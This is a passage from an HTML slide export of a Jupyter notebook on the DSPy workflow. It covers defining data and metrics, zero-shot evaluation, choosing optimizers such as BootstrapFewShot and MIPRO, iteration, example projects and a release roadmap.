</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="3.-Explore-a-few-examples">3. Explore a few examples<a class="anchor-link" href="#3.-Explore-a-few-examples"></a></h3><ul>
<li>consider using a large and powerful LM or a couple of different LMs, just to understand what's possible</li>
<li>you're stil using your pipeline zero-shot, so it will be far from perfect</li>
<li>understanding where things go wrong in zero-shot usage will go a long way</li>
<li>record the interesting (both easy and hard) examples you try; even if you don't have labels, simply tracking the inputs you tried will be useful for DSPy optimizers below</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="4.-Define-your-data">4. Define your data<a class="anchor-link" href="#4.-Define-your-data"></a></h3><ul>
<li>Time to more formally declare your training and validation data for DSPy evaluation and optimization</li>
<li>You can use DSPy optimizers usefully with as few as 10 examples, but having 50-100 examples (or even better, 300-500 examples) goes a long way.</li>
<li>If your task is extremely unusual, please invest in preparing ~10 examples by hand. Often times, depending on your metric below, you just need inputs and not labels, so it's not that hard.</li>
<li>chances are that your task is not actually that unique. You can almost always find somewhat adjacent datasets on, say, HuggingFace datasets or other forms of data that you can leverage here.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="5.-Define-your-metric">5. Define your metric<a class="anchor-link" href="#5.-Define-your-metric"></a></h3><ul>
<li>For simple tasks, this could be just "accuracy" or "exact match" or "F1 score". This may be the case for simple classification or short-form QA tasks.</li>
<li>However, for most applications, your system will output long-form outputs. There, your metric should probably be a smaller DSPy program that checks multiple properties of the output (quite possibly using AI feedback from LMs).
-Getting this right on the first try is unlikely, but you should start with something simple and iterate.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="6.-Collect-preliminary-%22zero-shot%22-evaluations">6. Collect preliminary "zero-shot" evaluations<a class="anchor-link" href="#6.-Collect-preliminary-%22zero-shot%22-evaluations"></a></h3><ul>
<li>Now that you have some data and a metric, run evaluation on your pipeline before any optimizer runs.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="7.-Compile-with-a-DSPy-optimizer">7. Compile with a DSPy optimizer<a class="anchor-link" href="#7.-Compile-with-a-DSPy-optimizer"></a></h3><ul>
<li>In general, you don't need to have labels for your pipeline steps, but your data examples need to have input values and whatever labels your metric requires (e.g., no labels if your metric is reference-free, but final output labels otherwise in most cases).</li>
<li>Here's the general guidance on getting started:<ul>
<li>If you have very little data, e.g. 10 examples of your task, use <code>BootstrapFewShot</code></li>
<li>If you have slightly more data, e.g. 50 examples of your task, use <code>BootstrapFewShotWithRandomSearch</code>.</li>
<li>If you have more data than that, e.g. 300 examples or more, use <code>MIPRO</code>.</li>
<li>If you have been able to use one of these with a large LM (e.g., 7B parameters or above) and need a very efficient program, compile that down to a small LM with <code>BootstrapFinetune</code>.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="8.-Iterate">8. Iterate<a class="anchor-link" href="#8.-Iterate"></a></h3><ul>
<li>Some questions you can ask yourself:<ul>
<li>Did you define your task well?</li>
<li>Do you need to collect (or find online) more data for your problem?</li>
<li>Do you want to update your metric?</li>
<li>And do you want to use a more sophisticated optimizer?</li>
<li>Do you need to consider advanced features like DSPy Assertions?</li>
<li>Or, perhaps most importantly, do you want to add some more complexity or steps in your DSPy program itself?</li>
<li>Do you want to use multiple optimizers in a sequence?</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Examples">Examples<a class="anchor-link" href="#Examples"></a></h2><ul>
<li><a href="https://github.com/stanford-oval/storm">STORM: Synthesis of Topic Outlines through Retrieval and Multi-perspective Question Asking</a>
<img alt="" src="https://arxiv.org/html/2402.14207v2/x2.png"/><ul>
<li><a href="https://github.com/stanford-oval/storm/blob/main/knowledge_storm/storm_wiki/engine.py">source code</a></li>
</ul>
</li>
<li><a href="https://x.com/lateinteraction/status/1783990747257360779">The ImageNet Moment of DSPy from Professor Bo Wangs Lab</a><ul>
<li><a href="https://arxiv.org/abs/2404.14544">WangLab at MEDIQA-CORR 2024: Optimized LLM-based Programs for Medical Error Detection and Correction
</a></li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Roadmap">Roadmap<a class="anchor-link" href="#Roadmap"></a></h2><p>The upcoming DSPy releases will have the following objectives.</p>
<ul>
<li>Polishing the core functionality.<ul>
<li>Objectives in this space include improved caching, saving/loading of LMs, support for streaming and async LM requests</li>
</ul>
</li>
<li>Developing more accurate, lower-cost optimizers.</li>
<li>Building end-to-end tutorials from DSPys ML workflow to deployment.</li>
<li>Shifting towards more interactive optimization &amp; tracking.</li>
</ul>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="References">References<a class="anchor-link" href="#References"></a></h2><p>Please see the notebook for more detailed references.</p>
</div>
</div>
</div>
</div>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
</div>
</div>
</div>
</div></section></section>
</div>
</div>
</main>
</body>
<script>
require(
    {
      // it makes sense to wait a little bit when you are loading
      // reveal from a cdn in a slow connection environment
      waitSeconds: 15
    },
    [
      "https://unpkg.com/reveal.js@4.0.2/dist/reveal.js",
      "https://unpkg.com/reveal.js@4.0.2/plugin/notes/notes.js"
    ],

    function(Reveal, RevealNotes){
        // Full list of configuration options available here: https://github.com/hakimel/reveal.js#configuration
        Reveal.initialize({
            controls: true,
            progress: true,
            history: true,
            transition: "slide",
            slideNumber: "",
            plugins: [RevealNotes],
            width: 960,
			      height: 700,

        });

        var update = function(event){
          if(MathJax.Hub.getAllJax(Reveal.getCurrentSlide())){
            MathJax.Hub.Rerender(Reveal.getCurrentSlide());
          }
        };

        Reveal.addEventListener('slidechanged', update);

        function setScrollingSlide() {
            var scroll = false
            if (scroll === true) {
              var h = $('.reveal').height() * 0.95;
              $('section.present').find('section')
                .filter(function() {
                  return $(this).height() > h;
                })
                .css('height', 'calc(95vh)')
                .css('overflow-y', 'scroll')
                .css('margin-top', '20px');
            }
        }

        // check and set the scrolling slide every time the slide change
        Reveal.addEventListener('slidechanged', setScrollingSlide);
    }
);
</script>
</html>
